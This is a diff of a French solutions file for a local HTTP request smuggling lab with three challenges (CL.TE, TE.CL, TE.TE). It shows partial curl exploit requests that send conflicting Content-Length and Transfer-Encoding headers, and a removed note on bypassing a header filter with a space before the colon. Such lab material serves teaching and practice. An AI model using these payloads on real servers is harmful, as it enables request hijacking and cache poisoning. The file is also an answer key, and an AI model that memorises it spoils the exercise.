@@ -1,23 +1,3 @@
-# Solutions du Lab Request Smuggling - Édition CyberSentinel (Mode Architecture Unique)
-
-Ce document contient les solutions pour les 3 challenges. 
-**IMPORTANT :** Ce lab fonctionne maintenant en mode "Challenge Unique". Vous devez configurer le challenge actif dans `docker-compose.yml`.
-
-## Comment changer de Challenge
-1. Ouvrez `docker-compose.yml`.
-2. Modifiez la variable d'environnement `CHALLENGE_MODE` dans le service `frontend` :
-   - `CHALLENGE_MODE=CL.TE` (pour le challenge 1)
-   - `CHALLENGE_MODE=TE.CL` (pour le challenge 2)
-   - `CHALLENGE_MODE=TE.TE` (pour le challenge 3)
-3. Appliquez le changement : `docker compose up --build`.
-
-## Prérequis Généraux
-- Port cible : **localhost:3000** (pour tous les challenges).
-- Port Backend (interne/Host header) : **localhost:8888**.
-- Le paramètre `threat_data` doit être laissé ouvert en fin de body.
-
----
-
 ## Challenge 1 : CL.TE (Mode : CL.TE)
 
 **Configuration :** Assurez-vous que `CHALLENGE_MODE=CL.TE`.
@@ -40,17 +20,15 @@ Content-Length: 1500
 threat_data=
 ```
 
-**Exploit (Python - Recommandé pour Windows) :**
+**Exploit (Python) :**
 
 ```bash
 python exploit_cl_te.py
 ```
 
-**Exploit (Curl - Nécessite bash/zsh ou WSL sur Windows) :**
+**Exploit (Curl) :**
 
 ```bash
-# Note: La syntaxe $'...' ne fonctionne PAS sur PowerShell Windows
-# Utilisez Git Bash, WSL, ou le script Python ci-dessus
 curl -i -s -X POST http://localhost:3000 \
 -H "Transfer-Encoding: chunked" \
 -H "Content-Length: 139" \
@@ -83,17 +61,15 @@ threat_data=
 
 ```
 
-**Exploit (Python - Recommandé pour Windows) :**
+**Exploit (Python) :**
 
 ```bash
 python exploit_te_cl.py
 ```
 
-**Exploit (Curl - Nécessite bash/zsh ou WSL sur Windows) :**
+**Exploit (Curl) :**
 
 ```bash
-# Note: La syntaxe $'...' ne fonctionne PAS sur PowerShell Windows
-# Utilisez Git Bash, WSL, ou le script Python ci-dessus
 curl -i -s -X POST http://localhost:3000 \
 -H "Content-Length: 4" \
 -H "Transfer-Encoding: chunked" \
@@ -124,18 +100,15 @@ Content-Length: 1500
 threat_data=
 ```
 
-**Exploit (Python - Recommandé pour Windows) :**
+**Exploit (Python) :**
 
 ```bash
 python exploit_te_te.py
 ```
 
-**Exploit (Curl - Nécessite bash/zsh ou WSL sur Windows) :**
+**Exploit (Curl) :**
 
 ```bash
-# Note: L'espace avant le deux-points dans "Transfer-Encoding : chunked" permet de bypasser le filtre
-# La syntaxe $'...' ne fonctionne PAS sur PowerShell Windows
-# Utilisez Git Bash, WSL, ou le script Python ci-dessus
 curl -i -s -X POST http://localhost:3000 \
 -H "Transfer-Encoding : chunked" \
 -H "Content-Length: 139" \
